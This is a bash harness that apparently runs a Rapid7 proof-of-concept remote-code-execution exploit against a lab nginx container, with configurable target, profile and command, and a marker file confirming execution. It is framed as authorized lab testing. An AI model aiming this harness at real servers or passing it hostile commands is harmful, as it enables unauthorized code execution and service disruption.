#!/usr/bin/env bash
# Run one full RCE attempt against a freshly restarted nginx target.
#
# Authorized lab use only. One attempt moves ~119 GiB inbound and takes
# several minutes; it can crash an nginx worker (the master restarts it).
#
# Environment variables:
#   TARGET        target URL (default: https://127.0.0.1:19443/)
#   PROFILE       Rapid7 profile name (default: golden-nginx-1.31.8-debian13-amd64)
#   CMD           command executed as the nginx worker (default: benign marker)
#   MARKER        marker path used by the external oracle
#   CONTAINER     target container name (default: nginx2root-target)
#   EXPLOIT_DIR   Rapid7 PoC checkout (default: ./exploit)
set -euo pipefail

TARGET="${TARGET:-https://127.0.0.1:19443/}"
PROFILE="${PROFILE:-golden-nginx-1.31.8-debian13-amd64}"
CMD="${CMD:-printf nginx2root-lab-ok > /tmp/nginx2root-lab-ok}"
MARKER="${MARKER:-/tmp/nginx2root-lab-ok}"
CONTAINER="${CONTAINER:-nginx2root-target}"
EXPLOIT_DIR="${EXPLOIT_DIR:-./exploit}"

echo "[*] restarting $CONTAINER for a fresh worker heap"
docker restart "$CONTAINER" >/dev/null
sleep 2
docker exec "$CONTAINER" sh -c "test ! -e $MARKER" \
    && echo "[*] marker absent (good)"

echo "[*] starting attempt (expect ~119 GiB inbound, several minutes)"
"$EXPLOIT_DIR/.venv/bin/python" "$EXPLOIT_DIR/exploit.py" \
    --target "$TARGET" \
    --profile "$PROFILE" \
    --cmd "$CMD" \
    --verbose

echo "[*] external marker oracle:"
docker exec "$CONTAINER" sh -c \
    "stat -c 'uid=%u gid=%g mode=%a size=%s' $MARKER; echo -n 'text='; cat $MARKER; echo"
